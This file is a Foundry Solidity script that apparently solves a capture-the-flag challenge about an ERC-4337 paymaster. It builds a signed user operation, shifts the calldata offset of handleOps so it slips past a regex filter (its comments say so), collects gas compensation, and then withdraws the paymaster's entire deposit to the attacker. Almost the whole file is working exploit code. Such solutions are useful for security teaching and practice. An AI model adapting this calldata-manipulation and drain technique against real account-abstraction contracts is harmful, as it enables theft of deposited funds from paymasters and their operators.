pragma solidity ^0.8.20;

import "forge-std/Script.sol";

import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "@account-abstraction/contracts/interfaces/IEntryPoint.sol";
import "@account-abstraction/contracts/interfaces/PackedUserOperation.sol";

interface ISetup {
    function paymaster() external view returns (IPaymaster);
    function accountFactory() external view returns (IAccountFactory);
    function account() external view returns (address);
    function isSolved() external view returns (bool);
}

interface IAccountFactory {
    function createAccount(address, uint256) external;
}

interface IPaymaster {
    function entryPoint() external view returns (IEntryPoint);
    function withdrawTo(address payable, uint256) external;
    function getDeposit() external view returns (uint256);
}

contract Solve is Script {

    uint priv = vm.envUint("PRIV");
    address user = vm.addr(priv);
    ISetup setup = ISetup(vm.envAddress("SETUP"));

    // forge script Solve --rpc-url <rpc-url> --sig "generate()" -vv
    function generate() public view {
        IAccountFactory accountFactory = setup.accountFactory();
        address account = setup.account();
        bytes memory initCode = abi.encodePacked(
            accountFactory,
            abi.encodeCall(accountFactory.createAccount, (user, 0))
        );

        IPaymaster paymaster = setup.paymaster();
        IEntryPoint entryPoint = paymaster.entryPoint();

        // Any value is ok, but remember not to be caught by the regex
        // It's used to get the compensation
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = PackedUserOperation({
            sender: account,
            nonce: 0,
            initCode: initCode,
            callData: new bytes(0),
            accountGasLimits: bytes32(abi.encodePacked(
                uint128(300000), uint128(10000)
            )),
            preVerificationGas: 650000,
            gasFees: bytes32(abi.encodePacked(
                uint128(1e12), uint128(1e12)
            )),
            paymasterAndData: abi.encodePacked(
                paymaster, uint128(100000), uint128(150000)
            ),
            signature: new bytes(0)
        });
        {
            bytes32 h = MessageHashUtils.toEthSignedMessageHash(
                abi.encodePacked(entryPoint.getUserOpHash(ops[0]))
            );
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, h);
            ops[0].signature = abi.encodePacked(r, s, v);
        }
        // abi.encode() will introduce a length prefix
        bytes memory data = abi.encode(ops);
        data = abi.encodePacked(
            IEntryPoint.handleOps.selector,
            uint(0x60), // change offset of ops to bypass regex replacement
            abi.encode(user),
            data
        );
        console.logBytes(data);
    }

    // forge script Solve --rpc-url <rpc-url> --broadcast -vvvv
    function run() public {
        // After receiving compensation from executing handleOps(),
        // you have ether to initiate a transaction
        vm.startBroadcast(priv);
        IPaymaster paymaster = setup.paymaster();
        paymaster.withdrawTo(payable(user), paymaster.getDeposit());
        require(setup.isSolved());
        vm.stopBroadcast();
    }
}
